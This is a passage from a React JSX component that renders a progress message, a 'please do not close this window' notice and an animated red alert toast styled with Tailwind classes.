                    <p className="text-sm font-semibold text-green-700">{progressMessage}</p>
                  </div>
                </div>
              )}

              <p className="mt-6 text-xs text-[oklch(0.6_0.02_250)] fade-in-up-delay-3">
                This may take a moment. Please do not close this window.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Alert Toast with fancy animation */}
      {alertMessage && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 max-w-sm w-[calc(100%-2rem)] z-[60] toast-enter">
          <div className="bg-gradient-to-r from-red-500 to-red-600 text-white rounded-xl px-5 py-4 shadow-2xl shadow-red-500/30 flex items-center gap-3">
            <div className="flex-shrink-0 bg-white/20 rounded-full p-1.5">
              <AlertTriangle className="h-5 w-5 text-white" />
            </div>
            <p className="text-sm font-semibold">{alertMessage}</p>
          </div>
        </div>
      )}
    </div>
  );
}
